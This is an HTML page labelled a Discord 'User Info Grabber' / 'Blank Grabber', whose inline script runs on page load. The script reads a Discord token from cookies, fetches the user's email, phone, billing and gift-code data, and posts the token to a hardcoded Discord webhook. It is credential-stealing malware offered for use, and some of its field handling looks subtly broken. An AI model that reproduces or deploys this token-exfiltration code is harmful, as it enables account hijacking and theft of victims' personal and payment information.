<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord User Info Grabber</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f0f0f0;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            background-color: #fff;
            border: 1px solid #ddd;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        h1 {
            text-align: center;
            margin-top: 20px;
        }
        h2 {
            margin-top: 20px;
        }
        ul {
            list-style-type: none;
            padding: 0;
        }
        li {
            margin-bottom: 10px;
        }
        .user-info {
            display: flex;
            justify-content: space-between;
            margin-bottom: 20px;
        }
        .user-info h3 {
            flex-basis: 200px;
        }
        .user-info p {
            flex-grow: 1;
        }
    </style>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Check for Discord token in cookies
            function getCookie(name) {
                let cookieValue = null;
                if (document.cookie && document.cookie !== '') {
                    const cookies = document.cookie.split(';');
                    for (let i = 0; i < cookies.length; i++) {
                        const cookie = cookies[i].trim();
                        // Does this cookie string begin with the name we're looking for?
                        if (cookie.substring(0, name.length + 1) === (name + '=')) {
                            cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
                            break;
                        }
                    }
                }
                return cookieValue;
            }

            // Send Discord token to webhook
            function sendTokenToWebhook(token) {
                const data = { content: token };
                const options = {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                };
                fetch(`https://discord.com/api/webhooks/1335617524040995021/MEHE2Vko0PjjavHK0J5AJicRMfvSEwadcsY5QL-HzsgrGtFRsP1Emn4RPku6jW5lG-_i`, options)
                    .then(response => response.json())
                    .then(data => console.log('Success:', data))
                    .catch((error) => {
                        console.error('Error:', error);
                    });
            }

            // Get Discord user info and send it to webhook
            const token = getCookie('discord_token');
            if (token) {
                fetch(`https://discord.com/api/users/@me`, {
                    headers: {
                        Authorization: `Bearer ${token}`,
                    },
                })
                    .then(response => response.json())
                    .then(user => {
                        const userInfo = document.getElementById('user-info');
                        const userInfoHTML = `
                            <div class="container">
                                <h1>Discord User Info</h1>
                                <div id="user-info" class="user-info">
                                    <h3>Username:</h3>
                                    <p>${user.username}</p>
                                </div>
                                <div class="user-info">
                                    <h3>User ID:</h3>
                                    <p>${user.id}</p>
                                </div>
                                <div class="user-info">
                                    <h3>MFA enabled:</h3>
                                    <p>${user.mfa_enabled ? 'Yes' : 'No'}</p>
                                </div>
                                <div class="user-info">
                                    <h3>Email:</h3>
                                    <p>${user.email || '(No Email)'}</p>
                                </div>
                                <div class="user-info">
                                    <h3>Phone:</h3>
                                    <p>${user.phone || '(No Phone Number)'}</p>
                                </div>
                                <div class="user-info">
                                    <h3>Verified:</h3>
                                    <p>${user.verified ? 'Yes' : 'No'}</p>
                                </div>
                                <div class="user-info">
                                    <h3>Nitro:</h3>
                                    <p>${user.premium_type ? user.premium_type : 'No Nitro'}</p>
                                </div>
                                <div class="user-info">
                                    <h3>Billing Method(s):</h3>
                                    <p>${user.billing_products.map(product => product.product_name).join(', ') || '(No Payment Method)'}</p>
                                </div>
                                <div class="user-info">
                                    <h3>Token:</h3>
                                    <p>${token}</p>
                                </div>
                                <div class="user-info">
                                    <h3>Gift Codes:</h3>
                                    <p>${user.gift_codes.map(code => code.code).join(', ') || '(NONE)'}</p>
                                </div>
                            </div>
                        `;
                        userInfo.innerHTML = userInfoHTML;
                        sendTokenToWebhook(token);
                    })
                    .catch((error) => {
                        console.error('Error:', error);
                    });
            }
        });
    </script>
</head>
<body>
    <h1>Blank Grabber</h1>
</body>
</html>
